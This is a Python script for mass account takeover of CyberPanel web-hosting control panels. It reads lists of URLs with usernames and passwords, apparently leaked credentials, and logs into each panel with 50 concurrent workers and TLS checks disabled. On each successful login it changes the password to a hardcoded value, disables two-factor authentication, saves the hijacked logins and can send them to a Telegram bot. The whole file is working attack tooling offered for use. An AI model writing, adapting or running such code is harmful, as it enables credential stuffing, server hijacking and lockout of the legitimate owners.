"""
cyberpanel.py — CyberPanel Checker (High Performance)
======================================================
• aiohttp async — 50 concurrent checks
• Watches Filter/Cyberpanel-Filter/ for new files dropped by down.py
• Login (with CSRF) → fetch user details → change password → save valid
• Invalid entries are NOT saved
• No lib dependency, no config.json

Usage:
    python cyberpanel.py                    # watch mode (default)
    python cyberpanel.py path/to/file.txt   # single file mode
"""

import asyncio
import aiohttp
import aiofiles
import os
import re
import sys
import ssl
import time
import hashlib
from datetime import datetime
from fake_useragent import UserAgent

ua = UserAgent()

# ── Config ─────────────────────────────────────────────────────────────────────
NEW_PASSWORD  = "Mnizar@012"
TG_TOKEN      = ""
TG_CHAT_ID    = ""

CONCURRENCY   = 50
TIMEOUT       = aiohttp.ClientTimeout(total=15)

# ── Folders ────────────────────────────────────────────────────────────────────
WATCH_DIR     = "../Filter/Cyberpanel-Filter"
VALID_DIR     = "../results-cms/Cyberpanel-Valid"
PROCESSED_DIR = "../Filter/Cyberpanel-Filter/processed"

for _d in [WATCH_DIR, VALID_DIR, PROCESSED_DIR]:
    os.makedirs(_d, exist_ok=True)

# ── SSL ────────────────────────────────────────────────────────────────────────
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE


def log(tag: str, msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{tag}] {msg}", flush=True)


# ── Telegram ───────────────────────────────────────────────────────────────────

async def send_telegram(session: aiohttp.ClientSession, url: str, username: str, password: str):
    if not TG_TOKEN or not TG_CHAT_ID:
        return
    try:
        domain = re.findall(r'://(.*?)(?:/|:|$)', url)
        domain_str = domain[0] if domain else url
        text = (
            f"✅ *CyberPanel Valid*\n"
            f"🌐 Domain: `{domain_str}`\n"
            f"🔗 URL: `{url}`\n"
            f"👤 Username: `{username}`\n"
            f"🔑 Password: `{password}`"
        )
        await session.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "Markdown"},
            timeout=aiohttp.ClientTimeout(total=10)
        )
    except Exception as e:
        log("TELEGRAM", f"Failed: {e}")


# ── Entry parser ───────────────────────────────────────────────────────────────

def normalize_url(raw: str) -> str:
    raw = raw.strip()
    if raw and not raw.startswith("http://") and not raw.startswith("https://"):
        raw = "https://" + raw
    return raw


def parse_entry(line: str):
    line = normalize_url(line.strip())
    if not line:
        return None, None, None
    try:
        if "|" in line:
            parts = line.split("|")
            if len(parts) >= 3:
                return parts[0].strip(), parts[1].strip(), parts[2].strip()
        else:
            scheme, rest = line.split("://", 1)
            parts = rest.split(":")
            if len(parts) >= 3:
                if parts[1].isdigit():
                    url  = f"{scheme}://{parts[0]}:{parts[1]}"
                    user = parts[2]
                    pwd  = ":".join(parts[3:]) if len(parts) > 3 else ""
                else:
                    url  = f"{scheme}://{parts[0]}"
                    user = parts[1]
                    pwd  = ":".join(parts[2:]) if len(parts) > 2 else ""
                return url.strip(), user.strip(), pwd.strip()
    except Exception:
        pass
    return None, None, None


# ── Core async checker ─────────────────────────────────────────────────────────

async def check_entry(session: aiohttp.ClientSession, semaphore: asyncio.Semaphore,
                       url: str, username: str, password: str) -> bool:
    async with semaphore:

        # ── Step 1: GET homepage to grab csrftoken ────────────────────────────
        try:
            async with session.get(url, ssl=SSL_CTX, headers={"User-Agent": ua.random}) as resp:
                set_cookie = resp.headers.get("Set-Cookie", "")
                csrf_matches = re.findall(r'csrftoken=(.*?);', set_cookie)
                if not csrf_matches:
                    log("CyberPanel", f"⚠️  No CSRF token → {url}")
                    return False
                csrf_token = csrf_matches[0]
        except Exception as e:
            log("CyberPanel", f"⚠️  Init error → {url} : {e}")
            return False

        # ── Step 2: POST login ────────────────────────────────────────────────
        try:
            async with session.post(
                url + "/verifyLogin",
                json={
                    "username":          username,
                    "password":          password,
                    "languageSelection": "english"
                },
                headers={
                    "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
                    "X-Csrftoken":  csrf_token,
                    "Referer":      url,
                },
                cookies={"csrftoken": csrf_token},
                ssl=SSL_CTX
            ) as resp:
                login_text = await resp.text()
                if '"loginStatus": 1' not in login_text:
                    log("CyberPanel", f"❌ Login failed  → {url}")
                    return False
        except Exception as e:
            log("CyberPanel", f"⚠️  Login error → {url} : {e}")
            return False

        log("CyberPanel", f"✅ Logged in    → {url} ({username})")

        # Refresh csrf from session cookies after login
        csrf_now = session.cookie_jar.filter_cookies(url).get("csrftoken")
        csrf_val = csrf_now.value if csrf_now else csrf_token

        change_headers = {
            "Accept":          "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control":   "no-cache",
            "Connection":      "keep-alive",
            "Content-Type":    "application/json;charset=UTF-8",
            "Origin":          url,
            "Pragma":          "no-cache",
            "Referer":         url + "/users/modifyUsers",
            "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "X-CSRFToken":     csrf_val,
        }

        # ── Step 3: Fetch user details ────────────────────────────────────────
        try:
            async with session.post(
                url + "/users/fetchUserDetails",
                json={"accountUsername": username},
                headers=change_headers,
                ssl=SSL_CTX
            ) as resp:
                user_data = await resp.json(content_type=None)
                details = user_data["userDetails"]
        except Exception as e:
            log("CyberPanel", f"⚠️  Fetch user details error → {url} : {e}")
            return False

        # ── Step 4: Save modifications (change password) ──────────────────────
        try:
            async with session.post(
                url + "/users/saveModifications",
                json={
                    "accountUsername": username,
                    "firstName":       details["firstName"],
                    "lastName":        details["lastName"],
                    "email":           details["email"],
                    "passwordByPass":  NEW_PASSWORD,
                    "securityLevel":   details["securityLevel"],
                    "twofa":           False
                },
                headers=change_headers,
                ssl=SSL_CTX
            ) as resp:
                change_text = await resp.text()
                if resp.status == 200 and '"status": 1' in change_text and '"saveStatus": 1' in change_text:
                    log("CyberPanel", f"🔑 Pwd changed  → {url}")
                    await send_telegram(session, url, username, NEW_PASSWORD)
                    async with aiofiles.open(
                        os.path.join(VALID_DIR, "valid.txt"), "a", encoding="utf-8"
                    ) as f:
                        await f.write(f"{url}|{username}|{NEW_PASSWORD}\n")
                    return True
                else:
                    log("CyberPanel", f"⚠️  Pwd change failed → {url}")
                    return False
        except Exception as e:
            log("CyberPanel", f"⚠️  Change error → {url} : {e}")
            return False


# ── File processor ─────────────────────────────────────────────────────────────

async def process_file(file_path: str):
    log("WATCH", f"📄 New file: {file_path}")

    async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        raw_lines = await f.readlines()

    entries = []
    for line in raw_lines:
        url, username, password = parse_entry(line)
        if url:
            entries.append((url, username, password))
        else:
            log("PARSE", f"⚠️  Skipping: {line.strip()}")

    if not entries:
        log("WATCH", "No valid entries found.")
    else:
        log("WATCH", f"🚀 Checking {len(entries)} entries with {CONCURRENCY} concurrent workers...")

        semaphore = asyncio.Semaphore(CONCURRENCY)
        connector = aiohttp.TCPConnector(ssl=SSL_CTX, limit=CONCURRENCY + 10)

        async with aiohttp.ClientSession(connector=connector, timeout=TIMEOUT) as session:
            tasks   = [check_entry(session, semaphore, u, usr, pwd) for u, usr, pwd in entries]
            results = await asyncio.gather(*tasks, return_exceptions=True)

        valid = sum(1 for r in results if r is True)
        log("WATCH", f"Done — ✅ {valid}/{len(entries)} changed.")

    dest = os.path.join(PROCESSED_DIR, os.path.basename(file_path))
    os.replace(file_path, dest)
    log("WATCH", f"Moved to processed: {dest}")


# ── Watcher ────────────────────────────────────────────────────────────────────

def file_hash(path: str) -> str:
    h = hashlib.md5()
    with open(path, "rb") as f:
        h.update(f.read(4096))
    return h.hexdigest()


async def watch():
    log("WATCH", f"👀 Listening on '{WATCH_DIR}/' ... (Ctrl+C to stop)")
    seen = {}
    while True:
        try:
            for fname in os.listdir(WATCH_DIR):
                if not fname.endswith(".txt"):
                    continue
                fpath = os.path.join(WATCH_DIR, fname)
                if not os.path.isfile(fpath):
                    continue
                fhash = file_hash(fpath)
                if seen.get(fname) == fhash:
                    continue
                seen[fname] = fhash
                await process_file(fpath)
        except KeyboardInterrupt:
            log("WATCH", "Stopped.")
            break
        except Exception as e:
            log("ERROR", str(e))
        await asyncio.sleep(3)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        asyncio.run(process_file(sys.argv[1]))
    else:
        asyncio.run(watch())